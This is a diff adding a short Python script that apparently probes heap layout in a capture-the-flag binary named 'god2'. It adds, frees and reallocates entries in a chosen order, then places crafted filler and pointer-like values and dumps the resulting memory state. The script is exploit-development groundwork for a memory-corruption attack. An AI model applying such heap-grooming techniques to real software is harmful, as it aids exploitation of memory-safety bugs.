@@ -1,0 +1,11 @@
+import sys,os; sys.path.insert(0,"/mnt/c/Users/ha/Downloads/pwn")
+from dumper import G
+g=G("god2")
+g.add(b"A1"); g.add(b"B2"); g.cook(b"Beef noodles")
+g.add(b"C3"); g.add(b"D4"); g.cook(b"Beef noodles")
+g.add(b"E5"); g.add(b"F6"); g.cook(b"Beef noodles")
+g.add(b"YY"); g.add(b"Z9"); g.cook(b"Beef noodles")
+for t in b"B2,A1,D4,C3,F6,E5,Z9,YY".split(b","): g.rm(t)
+g.add(b"CC")
+g.add(b"R"*16+b"A"); g.add(b"SLOTXX"); g.add(b"FDFDFD")
+g.dump("after CC + R,SLOT,FD"); g.close()
